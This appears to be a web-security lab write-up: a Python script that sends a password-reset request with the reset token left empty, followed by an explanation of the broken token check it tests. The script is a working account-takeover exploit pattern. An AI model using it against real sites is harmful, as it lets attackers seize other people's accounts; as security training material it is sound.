import requests

url = "https://target.com/forgot-password"
data = {
    "username": "wiener",
    "new-password-1": "newpass123",
    "new-password-2": "newpass123",
    "temp-forgot-password-token": ""
}

response = requests.post(url, data=data)

print(response.text)
🐍 2. Password Change Without Token Script

This script demonstrates the core vulnerability where the reset token is not validated by the server. Normally the request 
        should include a valid token parameter, but in this vulnerable application the token can be removed completely. The 
        script sends a POST request to the password reset endpoint with the token value intentionally left empty. If the 
        server still processes the request successfully, it confirms that the application does not check the token properly.
        This automation helps security testers quickly verify the vulnerability without manually editing requests in Burp 
        Suite every time. By modifying parameters in the script, testers can easily experiment with different usernames or 
        password values. The script also prints the server response to determine whether the password reset action was
        accepted. This demonstrates how attackers can exploit broken password reset logic using automated tools.

